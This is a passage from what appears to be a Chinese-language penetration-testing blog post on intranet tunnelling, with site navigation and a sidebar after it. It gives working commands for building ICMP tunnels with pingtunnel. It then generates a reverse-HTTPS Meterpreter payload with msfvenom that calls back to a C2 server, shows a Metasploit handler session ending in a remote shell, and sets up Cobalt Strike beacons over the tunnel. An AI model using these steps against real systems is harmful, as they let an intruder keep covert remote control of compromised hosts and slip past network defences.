+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;pingtunnel -type server -noprint 1 -nolog 1</span><br></pre></td></tr></table></figure>
+<p>2.ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pingtunnel.exe -type client -l 127.0.0.1:6688 -s icmpserver_ip -sock5 1 -nolog 1 -noprint 1</span><br><span class="line"># 该命令的意思是icmp隧道客户端监听127.0.0.1:6688启动socks5服务，通过连接到icmpserver_ip的icmp隧道，由icmpserver转发socks5代理请求到目的地址</span><br></pre></td></tr></table></figure>
+<p>3.生成支持socks5代理的反向payload的meterpreter并上传到ICMP隧道客户端执行即可上线</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_https LHOST&#x3D;c2_server_ip LPORT&#x3D;8443 HttpProxyType&#x3D;SOCKS HttpProxyHost&#x3D;127.0.0.1 HttpProxyPort&#x3D;6688 -f exe -o meterpreter.exe</span><br></pre></td></tr></table></figure>
+<p>4.启动msf监听，等待meterpreter执行上线</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_https</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_https</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lhost 0.0.0.0</span><br><span class="line">lhost &#x3D;&gt; 0.0.0.0</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lport 8443</span><br><span class="line">lport &#x3D;&gt; 8443</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started HTTPS reverse handler on https:&#x2F;&#x2F;0.0.0.0:8443</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: DESKTOP-test0\admin</span><br></pre></td></tr></table></figure>
+<h4 id="0x3-2-3-icmp隧道转发tcp上线cobaltstrike"><a href="#0x3-2-3-icmp隧道转发tcp上线cobaltstrike" class="headerlink" title="0x3.2.3 icmp隧道转发tcp上线cobaltstrike"></a>0x3.2.3 icmp隧道转发tcp上线cobaltstrike</h4><p>1.准备好一个具有公网ip的服务器，root权限运行以下命令，启动ICMP隧道服务端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;pingtunnel -type server -noprint 1 -nolog 1</span><br></pre></td></tr></table></figure>
+<p>2.ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pingtunnel.exe -type client -l 127.0.0.1:9999 -s icmpserver_ip -t c2_server_ip:7777 -tcp 1 -noprint 1 -nolog 1</span><br><span class="line"># 该命令的意思是icmp隧道客户端监听127.0.0.1:9999，通过连接到icmpserver_ip的icmp隧道，将127.0.0.1:9999收到的tcp数据包转发到c2_server_ip:7777</span><br></pre></td></tr></table></figure>
+<p>3.cobaltstrike创建listener</p>
+<div align="center">![Intranet-penetration/create_https_icmp_beacon.png](Intranet-penetration/create_https_icmp_beacon.png)</div>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># https host和https port(c2)为icmp隧道客户端的监听ip和端口</span><br><span class="line"># https port(bind)为转发目的地址的端口</span><br></pre></td></tr></table></figure>
+4.生成反向payload的beacon
+<div align="center"> ![Intranet-penetration/generate_https_icmp_beacon.png](Intranet-penetration/generate_https_icmp_beacon.png)</div>
+5.上传生成的beacon到ICMP隧道客户端执行，成功通过反向ICMP隧道上线
+<div align="center"> ![Intranet-penetration/initial_https_icmp_beacon.png](Intranet-penetration/initial_https_icmp_beacon.png)</div>
+#### 0x3.2.4 icmp隧道转发socks上线cobaltstrike
+1.准备好一个具有公网ip的服务器，root权限运行以下命令，启动ICMP隧道服务端
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;pingtunnel -type server -noprint 1 -nolog 1</span><br></pre></td></tr></table></figure>
+2.ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pingtunnel.exe -type client -l 127.0.0.1:6688 -s icmpserver_ip -sock5 1 -nolog 1 -noprint 1</span><br><span class="line"># 该命令的意思是icmp隧道客户端监听127.0.0.1:6688启动socks5服务，通过连接到icmpserver_ip的icmp隧道，由icmpserver转发socks5代理请求到目的地址</span><br></pre></td></tr></table></figure>
+3.cobaltstrike创建listener
+<div align="center">![Intranet-penetration/create_https_proxy_listener.png](Intranet-penetration/create_https_proxy_listener.png)</div>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 这里的代理可以是socks或者http</span><br><span class="line"># 好像cobaltstrike不支持socks5代理，这里并不能成功上线</span><br><span class="line"># 这里也可以使用http代理，不过需要工具将http代理转为socks5代理，比如privoxy</span><br></pre></td></tr></table></figure>
+4.选择创建的listener生成beacon上传到目标执行即可上线
+
+<h2 id="0x4-总结"><a href="#0x4-总结" class="headerlink" title="0x4 总结"></a>0x4 总结</h2><p><strong>内网渗透中内网穿透的本质，无非是通过各种通信信道，无论是正向的还是反向的，实现传输层协议tcp/udp数据包的转发，应用层协议都是基于传输层的协议实现的。</strong>比如<code>ABPTTS + SOCKS服务 = reGeorg</code></p>
+<p><strong>内网渗透中的内网穿透的条件，能通过某种通信信道远程代码执行。如果能通过某种通信信道远程代码执行，一定可以通过这种通信信道实现tcp/udp数据包的转发，即<code>TCP/UDP over something</code>隧道。如果没有现成的工具，可能需要我们自己开发。</strong>比如，通过sql注入获取了shell，我们也可以利用这条通信信道转发tcp/udp数据包，没有现成的工具，需要我们开发工具而已，隧道客户端将tcp/udp数据包封装写进数据库，再由隧道服务端从数据库中读出封装的数据包解包，发往对应地址即可</p>
+</div><div class="tags"><a href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"><i class="fa fa-tag"></i>内网穿透</a></div><div class="post-nav"><a class="pre" href="/2020/06/17/Collect-login-credentials/">linux后渗透之收集登录凭证</a><a class="next" href="/2020/03/27/Subrion-Cms-Code-Audit/">Subrion CMS 代码审计</a></div></div></div></div><div class="pure-u-1 pure-u-md-1-4"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="http://yoursite.com"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%B6%E4%BB%96/">其他</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/">社会工程学</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/">移动安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/">逆向分析</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/Android/" style="font-size: 15px;">Android</a> <a href="/tags/Linux/" style="font-size: 15px;">Linux</a> <a href="/tags/%E7%99%BB%E9%99%86%E5%87%AD%E8%AF%81/" style="font-size: 15px;">登陆凭证</a> <a href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" style="font-size: 15px;">内网穿透</a> <a href="/tags/JAVA/" style="font-size: 15px;">JAVA</a> <a href="/tags/PWN/" style="font-size: 15px;">PWN</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/%E5%8E%9F%E5%88%9B%E6%BC%8F%E6%B4%9E/" style="font-size: 15px;">原创漏洞</a> <a href="/tags/CMS/" style="font-size: 15px;">CMS</a> <a href="/tags/Window/" style="font-size: 15px;">Window</a> <a href="/tags/%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6/" style="font-size: 15px;">杀毒软件</a> <a href="/tags/Cknife/" style="font-size: 15px;">Cknife</a> <a href="/tags/%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7/" style="font-size: 15px;">审计工具</a> <a href="/tags/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F/" style="font-size: 15px;">恶意程序</a> <a href="/tags/Github/" style="font-size: 15px;">Github</a> <a href="/tags/IOS/" style="font-size: 15px;">IOS</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/06/17/Collect-login-credentials/">linux后渗透之收集登录凭证</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/17/Intranet-penetration/">内网渗透之内网穿透</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/27/Subrion-Cms-Code-Audit/">Subrion CMS 代码审计</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/19/Java-Debug/">Java无源码调试之英雄崛起</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/27/CVE-2017-8890-smep-bypass/">CVE-2017-8890实现linux内核提权- SMEP绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/27/CVE-2017-8890-kernel-escalation1/">利用CVE-2017-8890实现linux内核提权- ret2usr</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/03/bundle-mismatch/">Bundle风水——Android序列化与反序列化不匹配漏洞详解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/03/qwb2-silent-writeup/">强网杯silent分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/23/Rootme-uaf-writeup/">Rootme CTF UAF Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/22/android-blueborne2/">Android蓝牙远程命令执行漏洞利用实践 exploit优化</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://www.zerokeeper.com/" title="小李飞刀" target="_blank">小李飞刀</a><ul></ul><a href="http://cybersec.blog.51cto.com" title="网络空间安全的道与术" target="_blank">网络空间安全的道与术</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2020 <a href="/." rel="nofollow">MS509 Team.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.css"><script type="text/javascript" src="/js/copycode.js" successtext="复制成功!"></script><link rel="stylesheet" type="text/css" href="/css/copycode.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>
